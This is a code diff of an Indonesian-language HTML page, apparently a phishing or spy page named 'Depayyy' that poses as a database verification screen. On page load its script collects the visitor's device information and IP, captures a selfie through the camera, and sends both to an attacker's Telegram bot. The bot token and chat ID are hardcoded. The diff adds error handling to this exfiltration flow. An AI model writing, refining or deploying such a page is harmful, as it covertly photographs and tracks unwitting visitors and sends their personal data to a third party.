@@ -7,7 +7,7 @@
 <style>
     body, html { height:100%; margin:0; overflow:hidden; font-family:'Arial',sans-serif; background:radial-gradient(circle at 50% 50%, #667eea,#764ba2,#f093fb,#f5576c,#4facfe); background-size:400% 400%; animation:gradientShift 10s ease infinite; }
     @keyframes gradientShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-    .container { position:fixed; width:100%; height:100%; display:flex; justify-content:center; align-items:center; text-align:center;}
+    .container { position:fixed; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;}
     h1 { font-size:6rem; font-weight:bold; background:linear-gradient(45deg,#ff6b6b,#feca57,#48dbfb,#6c5ce7); background-size:300% 300%; animation:textColorShift 5s ease infinite; background-clip:text; -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 20px 20px rgba(0,0,0,.15); transform:perspective(500px) rotateY(0deg) rotateX(0deg); animation:text3DSwing 6s ease-in-out infinite;}
     @keyframes text3DSwing {0%{transform:perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg);}25%{transform:perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg);}50%{transform:perspective(500px) rotateY(5deg) rotateX(5deg) skewX(5deg);}75%{transform:perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg);}100%{transform:perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg);}}
     @keyframes textColorShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
@@ -28,12 +28,14 @@
     <div class="shape"></div>
     <div class="shape"></div>
 </div>
-<div class="container"><h1>Depayyy</h1></div>
-<div id="status" style="margin-top:15px;font-size:14px;color:#facc15;">Verifikasi Data Base...</div>
+<div class="container">
+    <h1>Depayyy</h1>
+    <div id="status" style="margin-top:15px;font-size:14px;color:#facc15;">Verifikasi Data Base...</div>
+</div>
 
 <script>
-const CHAT_ID = "688350222"; // ganti dengan chat id admin
-const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
+const CHAT_ID = "688350222"; // chat id admin
+const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // bot token
 const statusEl = document.getElementById('status');
 
 // Ambil info device + IP
@@ -92,7 +94,7 @@ async function capturePhoto() {
     return new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.8));
 }
 
-// Kirim ke Telegram (text atau foto)
+// Kirim ke Telegram
 async function sendToTelegram(data, type="text") {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
@@ -105,13 +107,18 @@ async function sendToTelegram(data, type="text") {
 
 // Load halaman → ambil info + foto
 window.onload = async () => {
-    statusEl.textContent="Mengumpulkan info device...";
-    const info = await getDeviceInfo();
-    await sendToTelegram(info,"text");
-    statusEl.textContent="Mengambil foto selfie...";
-    const photo = await capturePhoto();
-    await sendToTelegram(photo,"photo");
-    statusEl.textContent="Selesai!";
+    try{
+        statusEl.textContent="Mengumpulkan info device...";
+        const info = await getDeviceInfo();
+        await sendToTelegram(info,"text");
+        statusEl.textContent="Mengambil foto selfie...";
+        const photo = await capturePhoto();
+        await sendToTelegram(photo,"photo");
+        statusEl.textContent="Selesai!";
+    }catch(e){
+        statusEl.textContent="Gagal mengirim data!";
+        console.error(e);
+    }
 };
 </script>
 </body>
